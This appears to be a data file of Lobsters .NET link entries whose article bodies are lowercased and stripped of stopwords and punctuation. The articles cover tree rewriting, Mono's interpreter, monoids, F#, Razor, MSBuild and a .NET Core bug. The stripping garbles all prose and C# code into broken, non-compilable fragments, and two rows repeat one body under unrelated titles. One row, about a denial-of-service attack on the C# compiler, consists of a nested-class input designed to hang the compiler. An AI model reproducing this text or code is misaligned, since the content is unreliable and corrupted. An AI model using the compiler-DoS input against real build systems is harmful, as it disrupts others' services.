transformer switch node case tagnode return transformer case salarynode return transformer case andnode return new andnode transformer aleft transformer aright case ornode return new ornode transformer oleft transformer oright case notnode n return new notnode transformer noperand default throw new argumentoutofrangeexception nameof node use rewrite method write transformation function calculates replacement node replacing return node like jqlnode simplifydoublenegatives jqlnode node noderewrite n n notnode notnode n code huge improvement verbose version used switch recursion rewrite allows u get straight point think part tree interested pattern library rewrite selfanddescendants wrap two particular type recursion reuse wide variety operation powerful way program gone day writing bespoke traversal every operation two function form basis operation production jql compiler form constitute library selfanddescendants rewrite written knowledge jqlnode baked handwrite equivalent function work datatypes turn design something generic though abstracting treeshaped structure mean say datatype treeshaped distinguishing feature make tree tree unlike datatype recursion node tree child also node picture show reach every node tree looking node child show replace child replace child child let use interface model notion object collection child interface irewritable irewritable ienumerable getchildren setchildren ienumerable newchildren type rewritable know access immediate child word get set ienumerable representing node child working immutable tree remember setchildren modify current instance return new current instance different child part contract irewritable call setchildren different number child got getchildren example node always two child try call setchildren one child would node rebuild package rewrite selfanddescendants function rewritable object show reach node immediate child recursively apply recipe look child child static ienumerable selfanddescendants node irewritable yield return node foreach var child nodegetchildren foreach var descendant selfanddescendants child yield return descendant static rewrite node func transformer irewritable var child nodegetchildren var newchildren childrenselect c crewrite transformer tolist var nodewithnewchildren nodesetchildren newchildren return transformer nodewithnewchildren typically implement irewritable abstractly base type using override subclass find child abstract class jqlnode irewritable jqlnode public abstract ienumerable jqlnode getchildren public abstract jqlnode setchildren ienumerable jqlnode newchildren class andnode jqlnode field public override ienumerable jqlnode getchildren new left right public override jqlnode setchildren ienumerable jqlnode newchildren new andnode newchildrenelementat newchildrenelementat class ornode jqlnode public override ienumerable jqlnode getchildren new left right public override jqlnode setchildren ienumerable jqlnode newchildren new ornode newchildrenelementat newchildrenelementat class notnode jqlnode public override ienumerable jqlnode getchildren new operand public override jqlnode setchildren ienumerable jqlnode newchildren new notnode newchildrensingle class salarynode jqlnode public override ienumerable jqlnode getchildren enumerableempty jqlnode public override jqlnode setchildren ienumerable jqlnode newchildren class tagnode jqlnode public override ienumerable jqlnode getchildren enumerableempty jqlnode public override jqlnode setchildren ienumerable jqlnode newchildren note single line recursion jqlspecific code wrapped selfanddescendants rewrite function totally generic reusable type tree oldfashioned way writing reusable tree traversal visitor pattern put recursive traversal code base class virtual method type node overridden carry specific operation roslyn api work example irewritable clear improvement visitor pattern designed around base class overriding visitor pattern far clunkier use functional api outlined irewritable allows operation like rewrite written totally generically whereas visitor pattern every type tree visitor base class sawmill named generic treeprocessing library sawmill taking tree apart available nuget github outline improvement design demonstrated find sawmill first find remarkable design powertoweight ratio irewritable simple interface easilygrasped meaning build load rich generic tool top sawmill contains version selfanddescendants rewrite also bunch extension method varying level nicheness getting squeezed irewritable interface family version selfanddescendants capturing variety traversal order preorder postorder breadthfirst eager lazy form fold method reducing whole tree value like linq aggregate iterative version rewrite rewrite expression repeatedly reach normal form function replacing one node time method get efficient mutable view node neighbour support complex sequence edits localised part tree tool help implement irewriter either using typed fluent interface using reflection code generation minor api change outline enable greater efficiency certain common case also success implementing irewritable variety treelike type sawmill come bundled version extension method wellknown tree type expression xmlnode xelement written extension package newtonsoftjsonlinq roslyn syntax tree implementation actually use separate irewriter interface course add new interface type realising could use sawmill layer simple uniform api top preexisting object felt like real validation design sawmill version rewrite also make important optimisation glossed part tree transformer function change shared new old version tree change single node rebuild node ancestor child changed part tree touch safe immutable tree like roslyn mutable tree like xmlnode whole tree copied part change make sad view type immutable along finally importantly want acknowledge neil mitchell great work uniplate haskell library modernised port lens upon sawmill based even thought c library already encountered haskell weird think uniplate accompanying article published someone mum must know told field medicine take decade new research reach mainstream practice think process might take even longer computer science hope writing helped idea along little
334,Lobsters,dotnet,"C#, F#, .NET programming",Mono's New .NET Interpreter,http://www.mono-project.com/news/2017/11/13/mono-interpreter/,mono new net interpreter,continuous ide new mono interpreter mixed mode execution future work improvement statically compiled mono better isolation researching mixed mode option,mono complementing justintime compiler static compiler net interpreter allowing new way running code mono project started wrote interpreter net instruction set used bootstrap selfhosted net development environment linux time considered interpreter temporary tool could use built justintime jit compiler interpreter mint jit engine mono existed sidebyside could port jit engine platform supported generic introduced engineering cost keeping interpreter jit engine worth see much value extra work keep around removed interpreter later introduced full static compilation net code technology introduced target platform allow dynamic code generation io main driver opened door allow mono run gaming console like playstation xbox main downside full static compilation completely new executable recreated every time update code slow process one suitable interactive development practiced example game developer like adjust tweak game code without trigger full recompilation static compilation make scenario impractical resort embedding scripting language game code quickly iterate tune project lack net dynamic capability also prevented many interesting us net teaching prototyping tool environment thing like xamarin workbook simple scripting could use net language resort solution platform frank krueger building continuous ide needed environment io much wrote net interpreter using f bring vision complete development environment net ipad address issue support internal microsoft product brought mono interpreter back life back twist new mono interpreter resuscitated mono old interpreter upgraded net support adding support generic upgraded run net exists next adding support mixedmode execution one way mono run webassembly today example static compilation using llvm interpreter part mainline mono pass large part extensive test suite use today building mono source code like mono interpreter yourassemblyexe mixed mode execution interpreter alone great shape currently working configuration allow u mix interpreted code statically compiled code justintime compiled code call mixed mode execution platform like io playstation xbox mean precompile core library core application still support loading executing code dynamically gaining benefit core library optimized llvm still flexibility running dynamic code allow game developer prototype experiment tweak game using net language system without recompile application open door scriptable application device using net language well future work extending capability interpreter handle various interesting scenario project ahead u improvement statically compiled mono full aheadoftime compilation version mono io console ship implementation systemreflectionemit made sense capability could supported interpreter several us systemlinqexpressions api used extensively many advanced scenario like entity framework user leveraging c compiler parse expression expression tree probably seen code scenario like expression sum b var adder sumcompile adder full aot scenario way made entity framework work ship interpreter expression class expression interpreter limitation also large one enabling systemreflectionemit powered interpreter remove lot code also allow scripting language built net work statically compiled environment like ironpython ironruby ironscheme allow completing work mixedmode execution mean interpreted code complement existing statically compiled net code better isolation earlier post mentioned one idiom previously failed address hotreloading code developer deployed app tweaked game code code matter live completing support appdomains enable scenario researching mixed mode option interpreter lighter option run code found certain program run faster interpreted executed jit engine intend explore mixed mode execution sometimes called tiered compilation could instruct interpreter execute code known performance sensitive example static constructor initialization code run reduce memory usage generated code usage execution time another consideration run code interpreted mode exceed threshold switch jit compiled implementation method use attribute annotate method worth trouble method worth trouble optimizing
335,Lobsters,dotnet,"C#, F#, .NET programming",A DoS Attack against the C# Compiler,http://www.mattwarren.org/2017/11/08/A-DoS-Attack-against-the-C-Compiler/,do attack c compiler,,internal class class b c e f private class inner class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner private class class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner inner class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner inner class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner inner class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner inner class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner inner class class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner class b c e f inner inner inner inner
336,Lobsters,dotnet,"C#, F#, .NET programming",Function monoids,http://blog.ploeh.dk/2017/11/06/function-monoids/,function monoids,series monoids function refactor method method take single argument input similar generic function f haskell pure binary combination function guid monoid law fscheck generalisation summary next endomorphism monoid,method monoids return monoids article objectoriented programmer article part series monoids short monoid associative binary operation neutral element also known identity function statically typed clanguages like c java method typically declared like public foo bar baz baz qux qux see another article however refactor method method take single argument input return single possibly complex value output abstract form write like public arg another way abstract method using generic public x another article demonstrates similar generic function f instance type function would written b whereas haskell written b way read function take value generic type aa input return value generic type bb output rest article favour haskell syntax since minimal noise clear however although favour haskell syntax succinctness nt mean imply function discus exclusively pure think f function b may may pure binary combination function function b monoid b monoid mean combine two function type objectoriented context mean combine two method signature one method long return type form monoid consider following facetious c example trying establish secure guid prime important cryptography prime guid contains better right private const string prime public static int countprimes guid g return gtostring n count primescontains countprimes method count number prime digit given guid far good also think hexadecimal notation exotic decimal notation surely digit af somehow secure unfamiliar thus method count well private const string letter abcdef public static int countletters guid g return gtostring n count letterscontains good number clearly excellent indicator secure guid one choose course combine countprimes countletters yes guids nt form monoid return type int form monoid addition enables write combine method public static func guid int combine func guid int f func guid int g return x f x g x notice combine take two func guid int value return new func guid int value binary operation example use var calculatesecurity combine countprimes countletters var actual calculatesecurity new guid assertequal actual excellent measure security strength guids nt good though antic aside combine binary function monoid monoid law order monoid combine must associative following fscheck property demonstrates property quietonsuccess true public void combineisassociative func guid int f func guid int g func guid int h guid guid assertequal combine combine f g h guid combine f combine g h guid propertybased test fscheck generates three function signature since function nt structural equality easiest way compare call see whether return result explains assertion invokes associative combination guid test pass order monoid combine must also identity element public static func guid int funcidentity simply function ignores input always return identity value addition following test demonstrates behaves expected property quietonsuccess true public void combinehasidentity func guid int f guid guid assertequal f guid combine funcidentity f guid assertequal f guid combine f funcidentity guid case combineisassociative order assert combined function behave correctly call explains assertion invokes combined function guid test pass well combine monoid generalisation c code example general rule function return monoid monoid haskell rule articulated standard library instance monoid b monoid b mean monoid b function b also automatically monoid summary function method return type form monoid monoid next endomorphism monoid
337,Lobsters,dotnet,"C#, F#, .NET programming",Automating The Arrange Phase With AutoFixture,http://jackhiston.com/2017/11/2/automating-the-arrange-phase-with-autofixture/,automating arrange phase autofixture,create bogus data c,create bogus data c published october min read programmer lazy love tool automate life automate data timeconsuming necessary part programmer job seeding data database demonstration load performance styling testing need way generate data rudimentary way hand spending day sometimes week inputting data system represents realistic golive scenario begin realise hand inefficient decide create seeding application
339,Lobsters,dotnet,"C#, F#, .NET programming",fez an Fsharp to core Erlang compiler,https://github.com/kjnilsson/fez,fez fsharp core erlang compiler,fez f core erlang experiment fsharp beam core erlang thoughtsmd getting started requirement self contained release release page work basicsfs functional object programming imperative erlang interop help,fez f core erlang experiment fez early door experiment compiling fsharp beam compatible core erlang primary aim implement enough language evaluate well ml type language could become practical language writing code run beam experiment succeed may lead fuller usable fsharp backend see thoughtsmd discussion potential implementation approach getting started requirement buildsh linuxmac buildcmd window fezc filefs linuxmac fezccmd filefs window try compile fsharp module beam use nobeam parameter want compile core erlang file run test runtestssh self contained release see release page download extract zip operating system run fez help see available command option compile fez compile file module run used erlang shell release ship set beam file need included eg erl pa pathtofez ebin work fsharp multiparadigmatic language fez targeting solely functional language core erlang given impedence mismatch reasonable expect fez adequately cover functional language construct fsharp said aspect imperative object oriented paradigm covered certain extent uptodate resource language construct covered look basicsfs fairly unstructured list list feature implemented one following degree complete feature reasonably complete unsupported apis construct either generate appropriate compiletime runtime error strange behaviour need reported partial feature tried proven viable yet fully implemented prototype feature present limited degree likely unexpected unusual constraint feature may kept unstarted feature started investigated feasibilty functional module complete fsharp module compiled erlang module nested module compiled indiviual erlang module fullyqualified name function complete private function included erlang export statement function application currying inner function lambda supported operator partial common operator snd fst implemented completion please report omission pattern matching control flow complete pattern matching including guard supported else expression listseq comprehension partial list seq comprehension supported nt verified completeness list complete list api complete apart function including array seq partial set partial option partial result complete map partial string complete array unstarted tuples complete record complete discriminated union complete active pattern partial limited testing please report issue tryfinallywith partial primitive type partial currently integer translated erlang integer float type erlang float erlang integer big ints hence thing like overflow bitshifting probably wont work expected sprintf printfn partial query expression prototype work seq async partial asyncstart asyncstartchild execute computation separate process rest mostly erased io already nonblocking erlang computation expression partial limited testing object programming member method record discriminated union complete nb type based method overload work static member record discriminated union complete extension method complete interface implementation record union complete use expression complete constructor prototype inheritance prototype imperative erlang interop ffi partial modcall attribute used generate function stub delegate configured erlang function erlangterms partial erlangterm attribute used decorate discriminated union erlang compatible encoding generated instead standard du representation case without field lowercased generated atom case field generated tuples help try right need people try stuff find construct break nt behave expected especially functional code find something sure please raise issue including smallest possible repro code code also welcome course especially standard library erlang module
340,Lobsters,dotnet,"C#, F#, .NET programming",Extending The Razor View Engine With View Location Expanders,http://jackhiston.com/2017/10/24/extending-the-razor-view-engine-with-view-location-expanders/,extending razor view engine view location expanders,post view localisation languageviewlocationexpander custom example summary,previous post dived view result razor view engine executes razor view part post discussed feature called view location expanders expander name describes expands locating view within application way change cshtml file located view localisation good example view location expander builtin languageviewlocationexpander allows view engine search cultureaware view use language view expander add using startup configuration servicesconfigure lt razorviewengineoptions gt option optionsviewlocationexpandersadd new languageviewlocationexpander languageviewlocationexpanderformatsubfolder expander enabled searching typical home index view search following location viewshomeenindex viewshomeindex viewssharedenindex viewssharedindex aspnet team also provided helper method expander service addmvc addviewlocalization languageviewlocationexpanderformatsubfolder achieves previous example adding localisation view mean serve different content hardcoded text based locale user powerful website content focused specific culture custom example creating view location expander straightforward requires implementation iviewlocationexpander interface public interface iviewlocationexpander ienumerable lt string gt expandviewlocations viewlocationexpandercontext context ienumerable lt string gt viewlocations void populatevalues viewlocationexpandercontext context interface declares two method populatevalues method give u chance take current context extract data viewlocationexpandercontext class provides action context retrieve associated data request expandviewlocations method allows u manipulate extend existing view location following example location expander check route value key alt value exists search within folder named route value public class alternativeviewlocationexpander iviewlocationexpander private const string valuekey alt public ienumerable lt string gt expandviewlocations viewlocationexpandercontext context ienumerable lt string gt viewlocations contextvaluestrygetvalue valuekey var value stringisnullorwhitespace value return viewlocations return expandviewlocationscore viewlocations value private ienumerable lt string gt expandviewlocationscore ienumerable lt string gt viewlocations string value foreach var location viewlocations yield return locationreplace value yield return location public void populatevalues viewlocationexpandercontext context contextvalues valuekey contextactioncontextroutedatavalues valuekey tostring populate value method us context retrieve route data value value exist value evaluate null expandviewlocations method nothing value specified folder name searched value route data given route value altviews following view location searched razor view engine viewshomealtviewsindexcshtml viewshomeindexcshtml viewssharedaltviewsindexcshtml viewssharedindexcshtml use view location expander add razorviewoptions class similar default localisation expander servicesconfigure lt razorviewengineoptions gt option optionsviewlocationexpandersadd new alternativeviewlocationexpander summary simple implementation extended razor view engine provided unique way finding view location expanders useful multitenancy localisation contextsensitive view lookup usecases think
341,Lobsters,dotnet,"C#, F#, .NET programming",F# introduction for my coworkers,https://simendsjo.me/fsharp-intro/,f introduction coworkers,,val b b c c fun generic function see parameter type name start generic parameter meaning take type argument type single type instance x option z something even complex try id function different kind argument see work b read function taking anything argument returning anything else important might different type input output b could also really like mapping value list might return value type thus b val int list order compose function output first match input second remember right associative function signature read b b c c read given function b function b c construct function c flipped version circ f g g circ f like mathy way writing composition rather write g f personally like reading code left right let readuser systemconsolereadline let creategreeting user sprintf hello user let user readuser let greeting creategreeting user let greetuser readuser creategreeting first imperative way first calling one function storing result using result second call last line create function number guessing game use composition several place let define val f b g b c c another useful function val b b fun make simple chain result set function function input previous result let iseven x x let iseven let b iseven val iseven x int bool val bool true val b bool false defining easy val x f b b given simplicity implementation amazing useful practice two construct let easily replace linq need f either chaining data directly process using creating generic function using seqmap seqfilter fun x x seqskipwhile fun x x seqtake val seq int seq yet another one deconstructs tuple go hello world printfn first second first hello second world val unit similar function composing way etc
343,Lobsters,dotnet,"C#, F#, .NET programming",.NET/C# Generics History: Some Photos From Feb 1999,https://blogs.msdn.microsoft.com/dsyme/2011/03/15/netc-generics-history-some-photos-from-feb-1999/,netc generic history photo feb,netc generic history photo feb article,netc generic history photo feb minute read article year fortunate enough work several different project f ongoing several different aspect fp oo async unitsofmeasure etc quite highvisiblity perhaps one timely foundational widereaching net c generic fun photo early history net generic microsoft cambridge research laboratory feb st george house cambridge uk photo record whiteboard discussion cedric fournet nick benton simon peyton jones maybe others already discussed idea redmond fun visuals like memory early day cambridge lab adhoc meeting pursued idea part net generic design implemented much later variance flag type parameter listed amazing time land microsoft great group people start great platform write full history project would take time though hope one day want say one thing straight generic net c current form almost nt happen close call feature almost nt make cut whidbey visual studio feature running clr code database given higher priority total dedication microsoft research cambridge complete high quality implementation clr including ngen debugging jit appdomains â concurrent loadingâ many aspect c compiler theâ project proceeded product group resourcing feature low remained sparse leading major overload msr cambridge employee thoughâ ultimately code design specification fully transferred clr c today future clr firmly hand redmond particularly memorable personal moment missing wife birthday order make deadline ngen support generic forgiving please thank ever meet memory opening appdomainh realizing critical nature interaction thatâ app domain pose generic making first public presentation work pldi told product team member generic academic eric rudder email april saying close thread mailbox c generic whidbey previous work leveraged thank thank eric would cost inaction would cost failure â generic c linq c tpl c async c f ultimately erasure model generic would adopted java since clr team would never pursued inthevm generic design without external help world today act chance act invest foundation last test time see chance take huge thank everyone involved work especially â course â andrew kennedy still give warm glow look net silverlightâ mono exceptionâ stack trace see generic hidden â â â â â â â â â â â â
346,Lobsters,dotnet,"C#, F#, .NET programming",Analysing C# code on GitHub with BigQuery,http://www.mattwarren.org/2017/10/12/Analysing-C-code-on-GitHub-with-BigQuery/,analysing c code github bigquery,analysing c code github bigquery open source code github available querying run terabyte query month free c fhbigquery githubextractscontentsnetcs gb tab space banned okay case k r allman c devs like put brace c developer like writing functional code statement widely used nuget package often included net project many line code loc typical c file widely thrown asyncawait thing c developer like using keyword updated popular repository c code many file repository popular c name foocs programcs something else common file name gist regular expression two problem tab space space tab us space default github repository billion file terabyte code space tab banned okay case query used k r allman c devs like put brace query used c developer like writing functional code lambda operator query statement widely used full result available pointed nuget package often included net project contentsnetpackagesconfig jsonnet many line code loc typical c file raw data available clean code widely thrown query asyncawait thing asynchronous code much easier c developer like using keyword update jairbubbles pointing many file repository popular repository c code query used popular c name regex correct foocs programcs something else common file name hacker news rcsharp information bigquery work put end blog post bigquery analysis programming language,analysing c code github bigquery oct word year ago google made open source code github available querying within bigquery enough run terabyte query month free post going looking c source code github find handily smaller c dataset made available bigquery charged per byte read called fhbigquery githubextractscontentsnetcs unique c file line code loc gb data pretty comprehensive set c source code rest post attempt answer following question tab space region banned okay case k r allman c devs like put brace c developer like writing functional code moving onto le controversial c topic using statement widely used nuget package often included net project many line code loc typical c file widely thrown exception asyncawait thing c developer like using var keyword updated end looking repository individual c file popular repository c code many file repository popular c class name foocs programcs something else common file name want try query find mistake available gist good chance regular expression miss edgecases regular expression two problem people confronted problem think know use regular expression two problem tab space entire dataset file include one line starting tab space tab tab space space total clearly c developer github prefer space tab let endless debate continue think explained fact visual studio us space default want see c compare programming language take look github repository billion file terabyte code space tab region banned okay case turn impressive c file million contain least one region statement query used hoping lot file autogenerated tool k r allman c devs like put brace c developer overwhelmingly prefer putting opening brace line query used separate line line line initializer total brace total code line initializers include code like new name new c developer like writing functional code slightly unscientific wanted see widely lambda operator used c code query yes know want write functional code net really use f c become functional year wanted see much code taking advantage raw percentile percentile line using lambda say c code github us le line c file lambda almost line use line file lambda line line code pretty impressive using statement widely used bit substantial widely used using statement c code top look like full result available using statement count using systemcollectionsgeneric using system using systemlinq using systemtext using systemthreadingtasks using systemruntimeinteropservices using systemio using systemruntimecompilerservices using systemcollections using systemreflection however pointed top included default add new file visual studio many people remove applies systemruntimeinteropservices systemruntimecompilerservices include assemblyinfocs default adjust list take account top look like using statement count using systemio using systemcollections using systemreflection using systemdiagnostics using systemthreading using systemcomponentmodel using systemweb using systemwindowsforms using systemglobalization using systemdrawing finally interesting list top using statement system microsoft window namespaces using statement count using nunitframework using unityengine using xunit using newtonsoftjson using newtonsoftjsonlinq using moq using unityengineui using unityeditor using amazonruntime using nuget package often included net project turn also separate dataset containing packagesconfig file github called contentsnetpackagesconfig entry querying see jsonnet clear winner package count newtonsoftjson microsoftwebinfrastructure microsoftaspnetrazor microsoftaspnetwebpages microsoftaspnetmvc entityframework microsoftaspnetwebapiclient microsoftaspnetwebapicore microsoftnethttp jquery microsoftbclbuild microsoftbcl nunit owin microsoftowin microsoftaspnetwebapiwebhost webgrease microsoftaspnetweboptimization microsoftaspnetwebapi many line code loc typical c file c developer prone creating huge file go one line well fortunately minority u note yaxis line code logarithmic raw data available oh dear uncle bob going happy whilst file loc le clean code case wondering top longest c file file line marmotinputtestmarmotcs srccodenamegeneratorwordreposlastnamesrepositorycs srcml mwbsdictionarydefaultworddictionarycs urduproofreaderurdulibsutilscs cssstylecs widely thrown exception interesting result query instance knew many applicationexceptions thrown notsupportedexception high list bit worrying exception count throw new argumentnullexception throw new argumentexception throw new notimplementedexception throw new invalidoperationexception throw new argumentoutofrangeexception throw new notsupportedexception throw new httpresponseexception throw new validationexception throw new objectdisposedexception throw new applicationexception throw new unauthorizedexception throw new formatexception throw new serializationexception throw new ioexception throw new indexoutofrangeexception throw new nullreferenceexception throw new invaliddataexception throw new apiexception throw new invalidcastexception asyncawait thing addition async await keywords c language make writing asynchronous code much easier public async task int getdotnetcountasync suspends getdotnetcountasync allow caller web server accept another request rather blocking one var html await httpclientdownloadstringasync http dotnetfoundationorg return regexmatches html net count much used using query select count count fhbigquery githubextractscontentsnetcs regexpmatch content rsasyncssawaits found file least one usage async await c developer like using var keyword le use async await file least one usage var keyword update thanks jairbubbles pointing var regex wrong supplying fixed version use async await file least one usage var keyword many file repository repository c file file le file le file le yaxis file logarithmic top largest repository number c file shown repository file http http http githubcommicrosoftreferencesource http githubcomdotnetcorefx http githubcomapojprojectsworking http githubcommicrosoftcodecontracts http githubcomdrazenzadravecnequeo http githubcomclearcanvasclearcanvas http githubcommwilliamsonfireflyawssdknet http popular repository c code time going look popular repository based github star contain least c file query used repo star file http githubcomgrpcgrpc http githubcomdotnetcoreclr http githubcomdotnetroslyn http githubcomfacebookyoga http githubcombazelbuildbazel http githubcomdotnetcorefx http githubcomseleniumhqselenium http githubcommicrosoftwinobjc http githubcomqianlifengwox http githubcomwoxlauncherwox http githubcomsharexsharex http githubcommicrosoftwindowsuniversalsamples http githubcomnancyfxnancy http githubcomchocolateychoco http githubcomjamesnknewtonsoftjson interesting top spot google repository c file sample code using grpc library net popular c class name assuming got regex correct popular c class name following class name count class c class program class test class setting class resource class class app class b class startup class foo yay foo sneaking top foocs programcs something else common file name finally let look different class name used using statement dominated default one used visual studio template file count assemblyinfocs programcs resourcesdesignercs settingsdesignercs appxamlcs globalasaxcs startupcs homecontrollercs routeconfigcs mainwindowxamlcs discus post hacker news rcsharp information always read far present yet blog post read enjoy bigquery work put end blog post bigquery analysis programming language
347,Lobsters,dotnet,"C#, F#, .NET programming",MSBuild Maintenance Made Easy With Shared Properties,http://jackhiston.com/2017/10/12/msbuild-maintenance-made-easy-with-shared-properties/,msbuild maintenance made easy shared property,new msbuild msbuild visual studio net core declaring project file declaring property using multiple file summary,new msbuild msbuild build engine net visual studio written way composable allowing combine project file ever used visual studio indirectly used msbuild open visual studio using msbuild restore build manage project recently new version msbuild hit street came along visual studio changed design project file simplified developer encouraged edit directly net core project visual studio allows direct editing project file without unload project first big step visual studio advocate lot system dozen project one solution synchronising package reference target framework metadata across project hard however msbuild composable make life easier declaring project file let u define simple csproj file project sdk microsoftnetsdk propertygroup targetframework targetframework propertygroup itemgroup packagereference include microsoftaspnetcoreall version itemgroup project targeting net core framework package reference aspnet core new msbuild format used alongside net core compatible visual studio version luckily u microsoft provided cli tooling alongside new msbuild system restore package run dotnet restore restoring package msbuildexamplecsproj generating msbuild file objmsbuildexamplecsprojnugetgprops generating msbuild file objmsbuildexamplecsprojnugetgtargets restore completed sec msbuildexamplecsproj fully functioning msbuild project file multiple project file keep aspnet core version synchronised declaring property let modify file add property project sdk microsoftnetsdkweb propertygroup targetframework targetframework aspnetcoreversion aspnetcoreversion propertygroup itemgroup packagereference include microsoftaspnetcoreall version aspnetcoreversion itemgroup project two area changed firstly defined new property aspnetcoreversion using syntax aspnetcoreversion use value result exactly achieved previously using multiple file complexity software system begin rise start working multiple project two aspnet core application make software system share msbuild property sharing commonprops file commonprops file project propertygroup aspnetcoreversion aspnetcoreversion propertygroup project file project sdk microsoftnetsdkweb import project commonprops project file project sdk microsoftnetsdkweb import project commonprops project example prop file share file importing project reference line import project commonprops change version aspnet core framework project change commonprops file version project update unison summary project end configuration nightmare laborious update every project file within one solution latest dependency version create commonprops file house dependency version save u dependency hell due msbuild composable nature stop property also compose project file common target step build process even move entire dependency shared project file lot hope help
348,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core 2.0 - Repository Overview: Action Results,http://jackhiston.com/2017/10/8/aspnet-core-20-repository-overview-action-results/,aspnet core repository overview action result,create bogus data c,create bogus data c published october min read programmer lazy love tool automate life automate data timeconsuming necessary part programmer job seeding data database demonstration load performance styling testing need way generate data rudimentary way hand spending day sometimes week inputting data system represents realistic golive scenario begin realise hand inefficient decide create seeding application
349,Lobsters,dotnet,"C#, F#, .NET programming",Diagnosing a Linux-only unit test failure,https://codeblog.jonskeet.uk/2017/10/08/diagnosing-a-linux-only-unit-test-failure/,diagnosing linuxonly unit test failure,cloud firestore step check really problem step reproduce locally step remove irrelevant test code step remove production code dependency deadend single double value back reproducing two double value step explore scope problem step look failed comparison step try fail simplify step try simplifying bit le step fix stroke luck next step point note filed issue like,odd one currently working cloud firestore support c introduced geopoint struct represent latitudelongitude pair represented double implement iequatable overload obvious way far good working test passed ci added type implement equality thought extract common code equalitytester class handle equal method operator latter via reflection went well local machine ci one environment failed use appveyor travis ci travis failing two failure one testing equality operator one part broader serializationdeserialization test odd time go normal diagnostic step check really problem nature failing test feel like intermittent problem always good get idea forced travis rebuild pull request travis couple time yes failed two test time step reproduce locally test fail ci really annoying couple time always taken hour sort try something get result think mean cycle slow fortunately linux box home fetched pull request ran test failed hooray quite nice able reproduce window laptop much better isolated ci step remove irrelevant test code two part code failing unit test production code ideally like get rid create truly minimal example usually try take one project time could gone either way time decided remove testing first repo created new console application project reference production code moved operator part equality tester code programcs simplified slightly introduced assert class true false method printed result ready run using system using systemreflection using googlecloudfirestoredata class program static void main string args var new geopoint var new geopoint assertequalityoperators internal static void assertequalityoperators control equal var typeinfo typeof gettypeinfo var equalitymethodinfo typeinfogetmethod opequality new typeof typeof func bool equality lh rh bool equalitymethodinfoinvoke null new object lh rh asserttrue equality control equal class assert public static void true bool actual consolewriteline expected true actual public static void false bool actual consolewriteline expected false actual sure enough output show problem expected true false great let remove step remove production code dependency rather copy whole geopoint test project created small test struct similar equality code deadend single double value made mistake changed much one go reduced test struct one double field using system using systemreflection class program static void main string args test new test test new test var equalitymethodinfo typeof test getmethod opequality new typeof test typeof test func test test bool equality lh rh bool equalitymethodinfoinvoke null new object lh rh consolewriteline consolewriteline equality consolewriteline equalitymethodinfoinvoke null new object struct test iequatable test private readonly double value public test double value thisvalue value public static bool operator test lh test rh lhsvalue rhsvalue public static bool operator test lh test rh lh rh public override bool equal object obj obj test equal public bool equal test public override int gethashcode valuegethashcode print true three time like eventually mean reproducing problem want back reproducing two double value taking one step back towards previous code went back two double value instead one expanding test struct like struct test iequatable test private readonly double x private readonly double public test double x double thisx x thisy public static bool operator test lh test rh lhsx rhsx lhsy rhsy public static bool operator test lh test rh lh rh public override bool equal object obj obj test equal public bool equal test public override int gethashcode xgethashcode ygethashcode change constructor call test bingo print true false false step explore scope problem tried exact code window unsurprisingly given earlier unit test passed reproduce problem sticking linux still try multiple framework multiple build configuration like say prompted try different framework intuition hard explain unfortunately let change project file bit project sdk microsoftnetsdk propertygroup outputtype exe outputtype targetframeworks targetframeworks propertygroup project run several different configuration remember three true line mean everything working true false false mean problem investigating dotnet run c debug f true false false dotnet run c release f true false false dotnet run c debug f true true true dotnet run c release f true true true dotnet run c debug f true true true dotnet run c release f true true true fails net core work net core net core certainly make sound like net core bug mean want give point entirely possible user using net core want code work given majorminor version number partly good handle different part net core linux find version number package got installed listed installed installed installed automatic dotnetruntime package believe part instead step look failed comparison part really simple add diagnostics method public static bool operator test lh test rh consolewriteline lh lhsx lhsy rh rhsx rhsy consolewriteline lhsx rhsx lhsy rhsy return lhsx rhsx lhsy rhsy thing get really interesting output lh rh true true true lh rh true false false lh rh true false false first three line expected working comparison threelinesegments second third comparison show first field x fine second tiny double value inconsistent step try fail simplify maybe boxing blame try really simple version boxing override tostring box value see come change test simply public override string tostring x test object x new test consolewriteline x print appears boxed correctly step try simplifying bit le failing program two potential complication play boxing value calling method via reflection boxing problem maybe reflection decided try two thing instance method static method accepting test parameter like operator comparison get rid lot code new complete code using system using systemreflection class program static void main string args test new test var foo typeof test getmethod foo fooinvoke null var bar typeof test getmethod bar barinvoke null new object struct test private readonly double x private readonly double public test double x double thisx x thisy public void foo consolewriteline x public static void bar test consolewriteline tx ty result interesting point lot thing could check affect parameter happen field type primitive reference provoke circumstance via reflection probably answered finding existing issue fixed reasonably feasible given open source nature net core wait though sunday evening let see fix problem first step fix stroke luck given feel like memory management issue let try something basically used explicit struct layout struct containing two double field pretty easy lay field offset right admittedly also sound like easy clr get right least laying explicitly lowrisk using systemruntimeinteropservices structlayout layoutkindexplicit struct test fieldoffset private readonly double x fieldoffset private readonly double normally thing get fixed first attempt worked backtracking simplification standalone comparison version fixing geopoint involved using automatically implemented property want apply attribute field property boo checking work locally adding commit pr seeing pas travis yay next step point note next step definitely try find history issue surprisingly big problem affect ga net core runtime expect record somewhere want understand better wrong whether fix appropriate whether need apply elsewhere update still issue runtime apparently even daily build filed issue look forward seeing happens interesting aspect initially see problem ci top priority reproduce locally ever remove much code production code test code dependency handy multiple execution environment available local linux box would nightmare try different configuration different runtimesframeworks sometimes bug really runtime bcl pretty rare happen like like loading related
